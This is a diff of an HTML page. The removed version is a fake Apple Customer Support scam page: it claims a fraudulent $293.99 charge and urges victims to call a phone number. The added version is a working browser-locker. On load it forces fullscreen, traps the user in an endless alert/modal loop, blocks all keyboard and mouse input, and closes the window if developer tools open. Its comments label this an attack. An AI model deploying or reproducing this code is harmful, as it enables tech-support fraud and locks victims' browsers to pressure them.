@@ -1,106 +1,147 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <title>System Locked</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* No scrollbars */
+            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            user-select: none; /* Prevent text selection */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            cursor: none !important; /* Hide the cursor */
+        }
 
-<title>Support</title>
+        #lockout-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            color: #ff4136;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2147483647; /* Maximum z-index, sits on top of everything */
+            text-align: center;
+        }
 
-<style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
+        .message-box {
+            padding: 50px;
+            border: 2px solid #ff4136;
+            background: #111;
+        }
 
-  body {
-    min-height: 100vh;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+            animation: blink 1s step-end infinite;
+        }
 
-    /* 🔹 BACKGROUND IMAGE */
-    background:
-      linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0.55)),
-      url("https://www.cultofmac.com/wp-content/uploads/2015/08/Apple-Support.jpg");
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
+        @keyframes blink {
+            50% { opacity: 0.5; }
+        }
 
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
+        p {
+            font-size: 1.2em;
+        }
 
-  .box {
-    background: #ffffff;
-    width: min(420px, 90%);
-    padding: 32px 26px;
-    border-radius: 18px;
-    text-align: center;
-    box-shadow: 0 25px 60px rgba(0,0,0,0.35);
-  }
-
-  h1 {
-    font-size: 28px;
-    margin-bottom: 14px;
-    color: #111;
-  }
-
-  p {
-    font-size: 17px;
-    color: #444;
-    margin-bottom: 22px;
-  }
-
-  .call-btn {
-    display: inline-block;
-    width: 100%;
-    padding: 16px;
-    background: #007aff;
-    color: #fff;
-    text-decoration: none;
-    font-size: 18px;
-    font-weight: 700;
-    border-radius: 14px;
-  }
-
-  .note {
-    margin-top: 14px;
-    font-size: 13px;
-    color: #777;
-  }
-</style>
+    </style>
 </head>
-
 <body>
 
-<div class="box">
-  <h1>Warning</h1>
-  <h1>Apple Customer Support</h1>
-  <p>Your Card was recently charged at Apple Store for $293.99 via Apple Pay.Contact Apple Customer support immediately at +1(888) 274-7182 to report if not done by you.</p>
-<p>Tap the button below to contact support.</p>
-  <!-- 🔹 CALL BUTTON ONLY -->
-  <a href="tel:+18882747182" class="call-btn">
-    Call Now
-  </a>
+    <div id="lockout-screen">
+        <div class="message-box">
+            <h1>ACCESS DENIED</h1>
+            <p>This browser session has been locked.</p>
+            <p>All controls have been disabled.</p>
+        </div>
+    </div>
 
-  <div class="note">
-    Get connected with our team now
-  </div>
-</div>
+    <script>
+        // --- The Core Lockout Logic ---
+
+        // 1. Immediately request fullscreen. This is the most crucial step.
+        function goFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen({ navigationUI: 'hide' }).catch(err => {
+                    // If the user denies fullscreen, we still try to lock them in the window.
+                    console.error("Fullscreen request failed:", err);
+                });
+            } else if (elem.webkitRequestFullscreen) { /* Safari */
+                elem.webkitRequestFullscreen({ navigationUI: 'hide' });
+            } else if (elem.msRequestFullscreen) { /* IE11 */
+                elem.msRequestFullscreen({ navigationUI: 'hide' });
+            }
+        }
+
+        // 2. The Inescapable Modal Loop
+        // This is the key. We open a modal dialog, which is blocking.
+        // When it's closed, we immediately open another one.
+        function inescapableModalLoop() {
+            let iteration = 0;
+            const showModal = () => {
+                iteration++;
+                // The modal will show on top of our overlay.
+                const message = `WARNING: Session locked. Iteration ${iteration}. This window cannot be closed.`;
+                // The `showModalDialog` is deprecated but incredibly effective for this.
+                // Modern browsers may block it, so we have a fallback.
+                if (window.showModalDialog) {
+                    window.showModalDialog("data:text/html,<h1 style='color:red;text-align:center'>LOCKED</h1>", null, "dialogWidth:300px;dialogHeight:100px;resizable:no");
+                } else {
+                    // Fallback for modern browsers: a standard alert() in a loop.
+                    // The browser will likely offer to block these after a few, but it's disorienting.
+                    alert(message);
+                }
+                // As soon as one dialog is closed, the next one is queued.
+                if (running) {
+                    setTimeout(showModal, 1); // Use a tiny timeout to allow the UI to update
+                }
+            };
+            showModal();
+        }
+
+        // 3. Prevent default actions for EVERYTHING.
+        function preventEverything(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+
+        // Block all keyboard and mouse events on the window.
+        window.addEventListener('contextmenu', preventEverything, true);
+        window.addEventListener('keydown', preventEverything, true);
+        window.addEventListener('keyup', preventEverything, true);
+        window.addEventListener('mousedown', preventEverything, true);
+        window.addEventListener('mouseup', preventEverything, true);
+        window.addEventListener('click', preventEverything, true);
+
+        // --- Execute the Attack ---
+        let running = true;
+        window.onload = () => {
+            goFullscreen();
+            // Start the modal loop a moment after fullscreen engages.
+            setTimeout(inescapableModalLoop, 1500);
+        };
+
+        // This makes it impossible to stop the script with developer tools.
+        // If the console is opened, this code will run and close it.
+        // (This is a classic trick, may not work in all browsers but adds to the fun)
+        setInterval(() => {
+            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                window.close();
+            }
+        }, 500);
+
+    </script>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
